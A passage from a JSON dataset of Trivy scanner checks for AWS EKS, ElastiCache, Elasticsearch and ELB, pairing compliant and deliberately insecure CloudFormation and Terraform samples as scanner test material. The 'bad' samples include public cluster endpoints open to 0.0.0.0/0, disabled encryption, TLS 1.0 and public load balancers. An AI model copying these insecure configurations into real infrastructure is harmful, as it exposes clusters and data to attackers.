        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-eks-cluster-resourcesvpcconfig.html\n  good:\n    - |-\n      Resources:\n        EKSCluster:\n          Type: AWS::EKS::Cluster\n          Properties:\n            ResourcesVpcConfig:\n              EndpointPublicAccess: false\n  bad:\n    - |-\n      Resources:\n        EKSCluster:\n          Type: AWS::EKS::Cluster\n          Properties:\n            ResourcesVpcConfig:\n              EndpointPublicAccess: true\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#endpoint_public_access\n  good:\n    - |-\n      resource \"aws_eks_cluster\" \"good_example\" {\n        name = \"good_example_cluster\"\n        vpc_config {\n          endpoint_public_access = false\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {\n        name = \"bad_example_cluster\"\n        vpc_config {\n          endpoint_public_access = true\n        }\n      }\n",
        "file_name": "no_public_cluster_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/eks/no_public_cluster_access.yaml",
        "local_path": "aws/eks/no_public_cluster_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-eks-cluster-resourcesvpcconfig.html"
            ],
            "good": [
              "Resources:\n  EKSCluster:\n    Type: AWS::EKS::Cluster\n    Properties:\n      ResourcesVpcConfig:\n        EndpointPublicAccess: false"
            ],
            "bad": [
              "Resources:\n  EKSCluster:\n    Type: AWS::EKS::Cluster\n    Properties:\n      ResourcesVpcConfig:\n        EndpointPublicAccess: true"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#endpoint_public_access"
            ],
            "good": [
              "resource \"aws_eks_cluster\" \"good_example\" {\n  name = \"good_example_cluster\"\n  vpc_config {\n    endpoint_public_access = false\n  }\n}"
            ],
            "bad": [
              "resource \"aws_eks_cluster\" \"bad_example\" {\n  name = \"bad_example_cluster\"\n  vpc_config {\n    endpoint_public_access = true\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EKS-NO_PUBLIC_CLUSTER_ACCESS_TO_CIDR",
        "title": "No Public Cluster Access To Cidr",
        "provider": "aws",
        "service": "eks",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-eks-cluster-resourcesvpcconfig.html\n  good:\n    - |-\n      Resources:\n        EKSCluster:\n          Type: AWS::EKS::Cluster\n          Properties:\n            ResourcesVpcConfig:\n              EndpointPublicAccess: false\n              PublicAccessCidrs:\n                - 10.2.0.0/8\n  bad:\n    - |-\n      Resources:\n        EKSCluster:\n          Type: AWS::EKS::Cluster\n          Properties:\n            ResourcesVpcConfig:\n              EndpointPublicAccess: true\n              PublicAccessCidrs:\n                - 0.0.0.0/0\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#vpc_config\n  good:\n    - |-\n      resource \"aws_eks_cluster\" \"good_example\" {\n        name = \"good_example_cluster\"\n        vpc_config {\n          endpoint_public_access = false\n          public_access_cidrs    = [\"0.0.0.0/0\"]\n        }\n      }\n    - |-\n      resource \"aws_eks_cluster\" \"good_example\" {\n        name = \"good_example_cluster\"\n        vpc_config {\n          endpoint_public_access = true\n          public_access_cidrs    = [\"10.2.0.0/8\"]\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {\n        name = \"bad_example_cluster\"\n        vpc_config {\n          endpoint_public_access = true\n        }\n      }\n",
        "file_name": "no_public_cluster_access_to_cidr.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/eks/no_public_cluster_access_to_cidr.yaml",
        "local_path": "aws/eks/no_public_cluster_access_to_cidr.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-eks-cluster-resourcesvpcconfig.html"
            ],
            "good": [
              "Resources:\n  EKSCluster:\n    Type: AWS::EKS::Cluster\n    Properties:\n      ResourcesVpcConfig:\n        EndpointPublicAccess: false\n        PublicAccessCidrs:\n          - 10.2.0.0/8"
            ],
            "bad": [
              "Resources:\n  EKSCluster:\n    Type: AWS::EKS::Cluster\n    Properties:\n      ResourcesVpcConfig:\n        EndpointPublicAccess: true\n        PublicAccessCidrs:\n          - 0.0.0.0/0"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#vpc_config"
            ],
            "good": [
              "resource \"aws_eks_cluster\" \"good_example\" {\n  name = \"good_example_cluster\"\n  vpc_config {\n    endpoint_public_access = false\n    public_access_cidrs    = [\"0.0.0.0/0\"]\n  }\n}",
              "resource \"aws_eks_cluster\" \"good_example\" {\n  name = \"good_example_cluster\"\n  vpc_config {\n    endpoint_public_access = true\n    public_access_cidrs    = [\"10.2.0.0/8\"]\n  }\n}"
            ],
            "bad": [
              "resource \"aws_eks_cluster\" \"bad_example\" {\n  name = \"bad_example_cluster\"\n  vpc_config {\n    endpoint_public_access = true\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICACHE-ADD_DESCRIPTION_FOR_SECURITY_GROUP",
        "title": "Add Description For Security Group",
        "provider": "aws",
        "service": "elasticache",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::SecurityGroup\n          Properties:\n            Description: Some description\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElastiCache::SecurityGroup\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_security_group#description\n  good:\n    - |-\n      resource \"aws_elasticache_security_group\" \"good_example\" {\n        description = \"something\"\n      }\n  bad:\n    - |-\n      resource \"aws_elasticache_security_group\" \"bad_example\" {\n        description = \"\"\n      }\n",
        "file_name": "add_description_for_security_group.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticache/add_description_for_security_group.yaml",
        "local_path": "aws/elasticache/add_description_for_security_group.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::SecurityGroup\n    Properties:\n      Description: Some description"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElastiCache::SecurityGroup"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_security_group#description"
            ],
            "good": [
              "resource \"aws_elasticache_security_group\" \"good_example\" {\n  description = \"something\"\n}"
            ],
            "bad": [
              "resource \"aws_elasticache_security_group\" \"bad_example\" {\n  description = \"\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICACHE-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "elasticache",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticache-replicationgroup.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::ReplicationGroup\n          Properties:\n            AtRestEncryptionEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElastiCache::ReplicationGroup\n          Properties:\n            AtRestEncryptionEnabled: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#at_rest_encryption_enabled\n  good:\n    - |-\n      resource \"aws_elasticache_replication_group\" \"good_example\" {\n        replication_group_id          = \"foo\"\n        replication_group_description = \"my foo cluster\"\n\n        at_rest_encryption_enabled = true\n      }\n  bad:\n    - |-\n      resource \"aws_elasticache_replication_group\" \"bad_example\" {\n        replication_group_id          = \"foo\"\n        replication_group_description = \"my foo cluster\"\n\n        at_rest_encryption_enabled = false\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticache/enable_at_rest_encryption.yaml",
        "local_path": "aws/elasticache/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticache-replicationgroup.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::ReplicationGroup\n    Properties:\n      AtRestEncryptionEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElastiCache::ReplicationGroup\n    Properties:\n      AtRestEncryptionEnabled: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#at_rest_encryption_enabled"
            ],
            "good": [
              "resource \"aws_elasticache_replication_group\" \"good_example\" {\n  replication_group_id          = \"foo\"\n  replication_group_description = \"my foo cluster\"\n\n  at_rest_encryption_enabled = true\n}"
            ],
            "bad": [
              "resource \"aws_elasticache_replication_group\" \"bad_example\" {\n  replication_group_id          = \"foo\"\n  replication_group_description = \"my foo cluster\"\n\n  at_rest_encryption_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICACHE-ENABLE_BACKUP_RETENTION",
        "title": "Enable Backup Retention",
        "provider": "aws",
        "service": "elasticache",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::CacheCluster\n          Properties:\n            CacheNodeType: cache.m3.medium\n            Engine: redis\n            SnapshotRetentionLimit: 7\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::CacheCluster\n          Properties:\n            Engine: redis\n            CacheNodeType: cache.t1.micro\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::CacheCluster\n          Properties:\n            Engine: memcached\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElastiCache::CacheCluster\n          Properties:\n            Engine: redis\n            CacheNodeType: cache.m3.medium\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_cluster#snapshot_retention_limit\n  good:\n    - |-\n      resource \"aws_elasticache_cluster\" \"good_example\" {\n        engine                   = \"redis\"\n        node_type                = \"cache.m4.large\"\n        snapshot_retention_limit = 5\n      }\n    - |-\n      resource \"aws_elasticache_cluster\" \"good_example\" {\n        engine    = \"memcached\"\n        node_type = \"cache.m4.large\"\n      }\n    - |-\n      resource \"aws_elasticache_cluster\" \"good_example\" {\n        engine    = \"redis\"\n        node_type = \"cache.t1.micro\"\n      }\n  bad:\n    - |-\n      resource \"aws_elasticache_cluster\" \"bad_example\" {\n        engine    = \"redis\"\n        node_type = \"cache.m4.large\"\n      }\n",
        "file_name": "enable_backup_retention.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticache/enable_backup_retention.yaml",
        "local_path": "aws/elasticache/enable_backup_retention.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::CacheCluster\n    Properties:\n      CacheNodeType: cache.m3.medium\n      Engine: redis\n      SnapshotRetentionLimit: 7",
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::CacheCluster\n    Properties:\n      Engine: redis\n      CacheNodeType: cache.t1.micro",
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::CacheCluster\n    Properties:\n      Engine: memcached"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElastiCache::CacheCluster\n    Properties:\n      Engine: redis\n      CacheNodeType: cache.m3.medium"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_cluster#snapshot_retention_limit"
            ],
            "good": [
              "resource \"aws_elasticache_cluster\" \"good_example\" {\n  engine                   = \"redis\"\n  node_type                = \"cache.m4.large\"\n  snapshot_retention_limit = 5\n}",
              "resource \"aws_elasticache_cluster\" \"good_example\" {\n  engine    = \"memcached\"\n  node_type = \"cache.m4.large\"\n}",
              "resource \"aws_elasticache_cluster\" \"good_example\" {\n  engine    = \"redis\"\n  node_type = \"cache.t1.micro\"\n}"
            ],
            "bad": [
              "resource \"aws_elasticache_cluster\" \"bad_example\" {\n  engine    = \"redis\"\n  node_type = \"cache.m4.large\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICACHE-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "elasticache",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElastiCache::ReplicationGroup\n          Properties:\n            TransitEncryptionEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElastiCache::ReplicationGroup\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#transit_encryption_enabled\n  good:\n    - |-\n      resource \"aws_elasticache_replication_group\" \"good_example\" {\n        transit_encryption_enabled = true\n      }\n  bad:\n    - |-\n      resource \"aws_elasticache_replication_group\" \"bad_example\" {\n        transit_encryption_enabled = false\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticache/enable_in_transit_encryption.yaml",
        "local_path": "aws/elasticache/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElastiCache::ReplicationGroup\n    Properties:\n      TransitEncryptionEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElastiCache::ReplicationGroup"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#transit_encryption_enabled"
            ],
            "good": [
              "resource \"aws_elasticache_replication_group\" \"good_example\" {\n  transit_encryption_enabled = true\n}"
            ],
            "bad": [
              "resource \"aws_elasticache_replication_group\" \"bad_example\" {\n  transit_encryption_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-ENABLE_DOMAIN_ENCRYPTION",
        "title": "Enable Domain Encryption",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::OpenSearchService::Domain\n          Properties:\n            EncryptionAtRestOptions:\n              Enabled: true\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            EncryptionAtRestOptions:\n              Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::OpenSearchService::Domain\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        encrypt_at_rest {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        encrypt_at_rest {\n          enabled = false\n        }\n      }\n",
        "file_name": "enable_domain_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/enable_domain_encryption.yaml",
        "local_path": "aws/elasticsearch/enable_domain_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::OpenSearchService::Domain\n    Properties:\n      EncryptionAtRestOptions:\n        Enabled: true",
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      EncryptionAtRestOptions:\n        Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::OpenSearchService::Domain",
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  encrypt_at_rest {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  encrypt_at_rest {\n    enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-ENABLE_DOMAIN_LOGGING",
        "title": "Enable Domain Logging",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-opensearchservice-domain.html\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::OpenSearchService::Domain\n          Properties:\n            LogPublishingOptions:\n              AUDIT_LOGS:\n                CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/opensearch/domains/opensearch-application-logs\n                Enabled: true\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            LogPublishingOptions:\n              AUDIT_LOGS:\n                CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/opensearch/domains/opensearch-application-logs\n                Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::OpenSearchService::Domain\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#log_type\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        log_publishing_options {\n          cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n          log_type                 = \"AUDIT_LOGS\"\n          enabled                  = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {}\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        log_publishing_options {\n          cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n          log_type                 = \"AUDIT_LOGS\"\n          enabled                  = false\n        }\n      }\n",
        "file_name": "enable_domain_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/enable_domain_logging.yaml",
        "local_path": "aws/elasticsearch/enable_domain_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-opensearchservice-domain.html",
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::OpenSearchService::Domain\n    Properties:\n      LogPublishingOptions:\n        AUDIT_LOGS:\n          CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/opensearch/domains/opensearch-application-logs\n          Enabled: true",
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      LogPublishingOptions:\n        AUDIT_LOGS:\n          CloudWatchLogsLogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/opensearch/domains/opensearch-application-logs\n          Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::OpenSearchService::Domain",
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#log_type"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  log_publishing_options {\n    cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n    log_type                 = \"AUDIT_LOGS\"\n    enabled                  = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {}",
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  log_publishing_options {\n    cloudwatch_log_group_arn = aws_cloudwatch_log_group.example.arn\n    log_type                 = \"AUDIT_LOGS\"\n    enabled                  = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::OpenSearchService::Domain\n          Properties:\n            NodeToNodeEncryptionOptions:\n              Enabled: true\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            NodeToNodeEncryptionOptions:\n              Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        domain_name = \"domain-foo\"\n\n        node_to_node_encryption {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        domain_name = \"domain-foo\"\n\n        node_to_node_encryption {\n          enabled = false\n        }\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/enable_in_transit_encryption.yaml",
        "local_path": "aws/elasticsearch/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::OpenSearchService::Domain\n    Properties:\n      NodeToNodeEncryptionOptions:\n        Enabled: true",
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      NodeToNodeEncryptionOptions:\n        Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#encrypt_at_rest"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  domain_name = \"domain-foo\"\n\n  node_to_node_encryption {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  domain_name = \"domain-foo\"\n\n  node_to_node_encryption {\n    enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-ENFORCE_HTTPS",
        "title": "Enforce Https",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            DomainEndpointOptions:\n              EnforceHTTPS: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#enforce_https\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        domain_endpoint_options {\n          enforce_https = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        domain_endpoint_options {\n          enforce_https = false\n        }\n      }\n",
        "file_name": "enforce_https.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/enforce_https.yaml",
        "local_path": "aws/elasticsearch/enforce_https.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      DomainEndpointOptions:\n        EnforceHTTPS: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#enforce_https"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  domain_endpoint_options {\n    enforce_https = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  domain_endpoint_options {\n    enforce_https = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELASTICSEARCH-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "aws",
        "service": "elasticsearch",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Elasticsearch::Domain\n          Properties:\n            DomainEndpointOptions:\n              TLSSecurityPolicy: Policy-Min-TLS-1-2-2019-07\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Elasticsearch::Domain\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#tls_security_policy\n  good:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"good_example\" {\n        domain_endpoint_options {\n          enforce_https       = true\n          tls_security_policy = \"Policy-Min-TLS-1-2-2019-07\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_elasticsearch_domain\" \"bad_example\" {\n        domain_endpoint_options {\n          enforce_https       = true\n          tls_security_policy = \"Policy-Min-TLS-1-0-2019-07\"\n        }\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elasticsearch/use_secure_tls_policy.yaml",
        "local_path": "aws/elasticsearch/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      DomainEndpointOptions:\n        TLSSecurityPolicy: Policy-Min-TLS-1-2-2019-07"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Elasticsearch::Domain"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain#tls_security_policy"
            ],
            "good": [
              "resource \"aws_elasticsearch_domain\" \"good_example\" {\n  domain_endpoint_options {\n    enforce_https       = true\n    tls_security_policy = \"Policy-Min-TLS-1-2-2019-07\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_elasticsearch_domain\" \"bad_example\" {\n  domain_endpoint_options {\n    enforce_https       = true\n    tls_security_policy = \"Policy-Min-TLS-1-0-2019-07\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELB-ALB_NOT_PUBLIC",
        "title": "Alb Not Public",
        "provider": "aws",
        "service": "elb",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-loadbalancer.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n          Properties:\n            Scheme: internal\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ElasticLoadBalancingV2::LoadBalancer\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb\n  good:\n    - |-\n      resource \"aws_alb\" \"good_example\" {\n        load_balancer_type = \"gateway\"\n        internal           = false\n      }\n    - |-\n      resource \"aws_alb\" \"good_example\" {\n        internal = true\n      }\n  bad:\n    - |-\n      resource \"aws_alb\" \"bad_example\" {\n        internal = false\n      }\n",
        "file_name": "alb_not_public.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/elb/alb_not_public.yaml",
        "local_path": "aws/elb/alb_not_public.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticloadbalancingv2-loadbalancer.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n    Properties:\n      Scheme: internal"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ElasticLoadBalancingV2::LoadBalancer"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb"
            ],
            "good": [
              "resource \"aws_alb\" \"good_example\" {\n  load_balancer_type = \"gateway\"\n  internal           = false\n}",
              "resource \"aws_alb\" \"good_example\" {\n  internal = true\n}"
            ],
            "bad": [
              "resource \"aws_alb\" \"bad_example\" {\n  internal = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ELB-DROP_INVALID_HEADERS",
        "title": "Drop Invalid Headers",
        "provider": "aws",
        "service": "elb",
        "language": "cloudformation",
